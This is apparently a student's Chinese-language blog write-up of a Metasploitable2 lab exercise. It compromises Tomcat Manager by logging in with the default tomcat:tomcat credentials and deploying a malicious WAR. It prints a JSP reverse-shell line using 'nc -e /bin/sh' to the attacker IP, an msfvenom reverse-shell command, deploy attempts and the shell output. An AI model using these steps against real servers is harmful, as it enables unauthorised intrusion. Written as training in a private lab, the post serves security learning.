---
title: "Metasploitable2 渗透学习（四）—— Tomcat 弱口令与 WAR 部署攻击"
date: "2026-07-10"
tags: ["Security", "Metasploitable2"]
excerpt: "Tomcat Manager 弱口令登录 + 恶意 WAR 包上传获取 Shell：第一次全程手工复现，不用 Metasploit 完成完整攻击链。"
series: "metasploitable2"
seriesOrder: 4
---

## 前言

这次学习和之前三次有一个本质区别：**全程手工复现，没有使用 Metasploit。**

之前学 vsFTPd、Samba 时，我都是直接在 msfconsole 里搜索模块、设置参数、运行 Exploit。虽然拿到了 Shell，但我一直在想一个问题：如果没有 msfconsole，我是不是什么都做不了？

这次老师要求我用最原始的工具（curl、msfvenom、nc）完成整个攻击链。只有这样，才能真正理解每一步在干什么。

---

## 一、Tomcat 是什么

在学习之前，我连 Tomcat 是什么都不知道。

老师解释后我才理解：Tomcat 是 Apache 基金会的 Java Web 容器，专门用来运行 Java 编写的网站。

常见的 Web 服务器：

| 服务器 | 运行语言 | 说明 |
|--------|---------|------|
| Apache httpd | PHP | 生产环境常见 |
| Nginx | 静态文件 / 反向代理 | 生产环境常见 |
| Tomcat | Java | 这次的目标 |

Tomcat 有一个管理后台叫 **Manager**，管理员可以通过网页上传 `.war` 包（Java Web 应用的打包格式），自动部署成一个网站。

这个功能本身是正常的运维需求，但如果被攻击者利用，就能上传恶意代码。

---

## 二、端口扫描

首先使用 Nmap 扫描靶机：

```bash
nmap -sV -p8180 192.168.93.148
```

扫描结果：

```
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

8180 端口开着 HTTP 服务，后端是 Tomcat。

---

## 三、访问 Tomcat 首页

用 curl 访问：

```bash
curl http://192.168.93.148:8180/
```

看到了 Tomcat 的默认欢迎页。这个页面本身没有漏洞，但暴露了 Tomcat 版本号。

---

## 四、发现 Manager 后台

Tomcat Manager 的地址是固定的：

```text
http://IP:8180/manager/html
```

访问后返回 `401 Unauthorized`，需要输入用户名密码才能进入。

这说明 Manager 后台存在，而且需要认证。

---

## 五、弱口令登录

Tomcat 默认的用户名密码是 `tomcat` / `tomcat`。

在浏览器中输入后，成功进入了 **Tomcat Web Application Manager**。

页面上列出了已经部署好的网站：

| 路径 | 说明 |
|------|------|
| / | 默认首页 |
| /admin | 管理后台 |
| /manager | Manager 页面 |
| /jsp-examples | JSP 示例 |

页面下方有一个 **Deploy** 区域，可以上传 WAR 包部署新的 Web 应用。

这一步让我意识到：**Tomcat 本身没有漏洞，问题出在管理员没有修改默认密码。** 和 Telnet 的弱口令攻击本质相同。

---

## 六、查看用户权限

在 Manager 页面上没有找到用户管理功能，但通过访问 Administration Tool（`/admin`）的 User Definition 页面，可以看到系统中的用户和角色：

**角色列表：**

| 角色 |
|------|
| admin |
| manager |
| role1 |
| tomcat |

**用户列表：**

| 用户 | 拥有的角色 |
|------|-----------|
| tomcat | admin, manager, tomcat |
| both | role1, tomcat |
| role1 | 未查看 |

这一步的目的是搞清楚每个账号的权限，而不是盲目猜测。

---

## 七、生成恶意 WAR 包

### 理解 WAR 包结构

一个 WAR 包里面包含：

```text
shell.war
├── index.jsp       ← 网页文件（我们的恶意代码放在这里）
└── WEB-INF/
    └── web.xml     ← 配置文件
```

恶意代码的作用是：当有人访问这个页面时，把目标机器的 Shell 反弹到攻击者的 Kali 上。

恶意代码长这样：

```jsp
<%
Runtime.getRuntime().exec("nc -e /bin/sh 192.168.93.146 4444");
%>
```

这行代码的意思：

* `Runtime.getRuntime()` — 获取系统的运行环境
* `.exec("nc -e /bin/sh ...")` — 执行系统命令
* `nc -e /bin/sh 192.168.93.146 4444` — 把 Shell 传回 Kali 的 4444 端口

### 使用 msfvenom 生成

手写 WAR 包需要配置 web.xml 等文件，比较麻烦。所以用 msfvenom 自动打包：

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.93.146 LPORT=4444 -f war -o shell.war
```

参数说明：

| 参数 | 含义 |
|------|------|
| `-p java/jsp_shell_reverse_tcp` | Java 反弹 Shell 的 payload |
| `LHOST=192.168.93.146` | Kali 的 IP，Shell 反弹到这里 |
| `LPORT=4444` | 监听端口 |
| `-f war` | 输出格式为 WAR 包 |
| `-o shell.war` | 输出文件名 |

执行结果：

```
Payload size: 1108 bytes
Final size of war file: 1108 bytes
Saved as: shell.war
```

---

## 八、上传 WAR 包

### 尝试 curl 上传（失败）

首先尝试用 curl 通过 Manager 的文本接口上传：

```bash
curl -u tomcat:tomcat --upload-file shell.war "http://192.168.93.148:8180/manager/text/deploy?path=/shell"
```

返回 `403 Forbidden`。

原因分析：`tomcat` 这个账号只有 `manager-gui` 角色（浏览器访问），没有 `manager-script` 角色（文本接口访问）。

尝试换用 `both:tomcat` 账号，同样返回 403。

### 通过浏览器上传（成功）

最终通过 Manager 页面的 Deploy 功能，直接在浏览器中上传 WAR 文件，部署成功。

这一步让我认识到：**渗透测试中遇到阻碍时，要灵活换思路，而不是死磕一个方法。**

---

## 九、触发反弹 Shell

### 第一步：在 Kali 开启监听

```bash
nc -lvnp 4444
```

参数说明：

| 参数 | 含义 |
|------|------|
| -l | 监听模式 |
| -v | 显示详细信息 |
| -n | 不做 DNS 解析 |
| -p 4444 | 监听端口 |

### 第二步：访问恶意页面

```bash
curl http://192.168.93.148:8180/shell/
```

访问这个 URL 时，Tomcat 会执行 JSP 代码，触发 `nc -e /bin/sh`，把 Shell 反弹到 Kali。

### 第三步：获得 Shell

nc 监听窗口显示：

```
listening on [any] 4444 ...
connect to [192.168.93.146] from (UNKNOWN) [192.168.93.148] 59761
```

连接成功。执行命令验证：

```bash
whoami
```

输出：

```
tomcat55
```

```bash
pwd
```

输出：

```
/
```

成功获得了 `tomcat55` 用户的 Shell。

---

## 十、完整攻击链

```text
nmap 发现 8180 端口
      ↓
curl 访问 Manager 后台 → 需要登录
      ↓
试默认口令 tomcat:tomcat → 登录成功
      ↓
msfvenom 生成恶意 WAR 包
      ↓
浏览器上传 WAR 包到 Manager
      ↓
curl 访问部署路径 → 触发反弹 Shell
      ↓
nc 监听 → 拿到 tomcat55 用户的 Shell
```

---

## 十一、为什么不是 Root 权限？

之前学 Samba 漏洞时，直接拿到了 Root 权限。这次只拿到了 `tomcat55`。

原因：Samba 服务以 Root 身份运行，所以漏洞触发后执行的命令也是 Root。

而 Tomcat 服务以 `tomcat55` 用户身份运行，所以获得的 Shell 也是 `tomcat55`。

如果要拿到 Root 权限，还需要进行**提权**，这是后续学习的内容。

---

## 十二、本课核心知识点

| 知识点 | 说明 |
|--------|------|
| Tomcat Manager | Web 管理后台，可上传部署 WAR 包 |
| WAR 包 | Java Web 应用的打包格式，可包含 JSP 代码 |
| 弱口令攻击 | 默认账号 tomcat:tomcat 未修改 |
| 文件上传漏洞 | Manager 允许上传任意 WAR 包 |
| 反弹 Shell | 通过 nc -e /bin/sh 把 shell 传回攻击机 |
| msfvenom | Metasploit 的 payload 生成工具 |

---

## 十三、和之前的对比

| 服务 | 攻击方式 | 本质 | 拿到权限 |
|------|----------|------|----------|
| vsFTPd | 供应链后门 | 软件被人植入恶意代码 | Root |
| Telnet | 弱口令 | 默认账号密码没改 | msfadmin |
| Samba | 命令注入 | 代码拼接导致命令执行 | Root |
| Tomcat | 弱口令 + 文件上传 | 默认密码 + Manager 功能被滥用 | tomcat55 |

---

## 学习心得

这次学习最大的不同是全程没有使用 Metasploit，而是用 curl、msfvenom、nc 完成了整个攻击链。

之前我一直在担心：如果没有 msfconsole，我什么都做不了。但这次实验证明，只要理解了漏洞原理，用最基础的工具一样可以完成攻击。

msfconsole 的作用是把多个步骤自动化，节省时间。但如果不知道它在背后做了什么，那我只是在盲敲命令。

这次学习也让我认识到，渗透测试中遇到阻碍时要灵活换思路。curl 上传失败后，换用浏览器上传就成功了。实际渗透中不可能一帆风顺，重要的是分析失败原因，找到替代方案。
